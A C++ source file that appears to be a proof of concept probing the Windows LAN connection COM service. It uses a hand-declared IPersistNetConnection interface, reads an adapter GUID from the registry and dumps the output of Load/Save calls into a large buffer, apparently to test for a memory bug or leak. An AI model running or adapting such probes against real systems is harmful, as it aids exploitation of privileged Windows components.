
#include <windows.h>
#include <wrl.h>
#include <comdef.h>
#include <wchar.h>
#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <SetupAPI.h>
#include <Shlwapi.h>
#include <strsafe.h>
#include <assert.h>
#include <conio.h>

using namespace Microsoft::WRL;

#define MAX_LOG_MESSAGE 1024
typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, * PLEVEL;
BOOL LogMessage(LEVEL Level, LPCTSTR Format, ...)
{
	TCHAR Buffer[MAX_LOG_MESSAGE] = { 0 };
	va_list Args;

	va_start(Args, Format);
	StringCchVPrintf(Buffer, MAX_LOG_MESSAGE, Format, Args);
	va_end(Args);

	switch (Level) {
	case L_DEBUG: _ftprintf(stdout, TEXT("[?] %s\n"), Buffer); break;
	case L_INFO:  _ftprintf(stdout, TEXT("[+] %s\n"), Buffer); break;
	case L_WARN:  _ftprintf(stderr, TEXT("[*] %s\n"), Buffer); break;
	case L_ERROR: _ftprintf(stderr, TEXT("[!] %s\n"), Buffer); break;
	}

	fflush(stdout);
	fflush(stderr);

	return TRUE;
}

static HRESULT Check(HRESULT hr)
{
	if (FAILED(hr))
		throw _com_error(hr, nullptr);
	return hr;
}

class __declspec(uuid("FAEDCF59-31FE-11D1-AAD2-00805FC1270E")) IPersistNetConnection : public IUnknown
{
public:
	virtual HRESULT __stdcall GetClassID(CLSID*) = 0;
	virtual HRESULT __stdcall GetSizeMax() = 0;
	virtual HRESULT __stdcall Load(GUID*, int) = 0;
	virtual HRESULT __stdcall Save(char*, int) = 0;
};


int main() {
	Check(CoInitializeEx(nullptr, COINIT_MULTITHREADED));
	IID CLS_LANCONN;
	CLSIDFromString(L"{ba126adb-2166-11d1-b1d0-00805fc1270e}", &CLS_LANCONN);
	LogMessage(L_INFO, "start.");
	ComPtr<IPersistNetConnection> iPerNetConn;
	HRESULT hr = Check(CoCreateInstance(CLS_LANCONN, NULL, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&iPerNetConn)));
	if (hr != S_OK) {
		LogMessage(L_ERROR, "Create instance Error: 0x%x", hr);
		return 0;
	}
	LogMessage(L_INFO, "Create instance success.");
	HKEY hKey = NULL;
	HKEY hSubKey = NULL;
	DWORD index = 0;
	DWORD cchLength = 0x100;
	GUID guid;
	DWORD dwType = REG_SZ;
	LSTATUS nRes = 0;
	wchar_t lpName[0x100] = { 0 };
	wchar_t lpQueryName[MAX_PATH] = { 0 };
	wchar_t* szSubKey = L"SYSTEM\\CurrentControlSet\\Control\\Network\\{4D36E972-E325-11CE-BFC1-08002BE10318}";
	if (!RegOpenKeyExW(HKEY_LOCAL_MACHINE, szSubKey, 0, KEY_READ, &hKey)) {
		LogMessage(L_INFO, "Query key %x", hKey);
		while (!RegEnumKeyExW(hKey, index, lpName, &cchLength, NULL, NULL, NULL, NULL)) {
			if (CLSIDFromString(lpName, &guid) == S_OK) {
				swprintf_s(lpQueryName,MAX_PATH, L"%s\\%s\\Connection", szSubKey, lpName);
				if (!RegOpenKeyExW(HKEY_LOCAL_MACHINE, lpQueryName, 0, KEY_READ, &hSubKey)) {
					nRes = RegQueryValueExW(hSubKey, L"PnpInstanceID", NULL, &dwType, NULL, NULL);
					if (nRes == ERROR_SUCCESS || nRes == ERROR_MORE_DATA) {
						LogMessage(L_INFO, "GUID: %ls", lpName);
						break;
					}
				}
			}
			index++;
			cchLength = 0x100;
		}
	}
	if (hKey) {
		RegCloseKey(hKey);
	}
	if (hSubKey) {
		RegCloseKey(hSubKey);
	}

	hr = iPerNetConn->Load(&guid, 0x10);
	if (hr != S_OK) {
		LogMessage(L_ERROR, "Create instance Error: 0x%x", hr);
		return 0;
	}

	char buf[0xffff] = { 0 };

	hr = iPerNetConn->Save(buf, 0xffff);
	if (hr != S_OK) {
		LogMessage(L_ERROR, "Create instance Error: 0x%x", hr);
		return 0;
	}
	LogMessage(L_INFO, "finish.buff: %s", buf);
	return 0;
}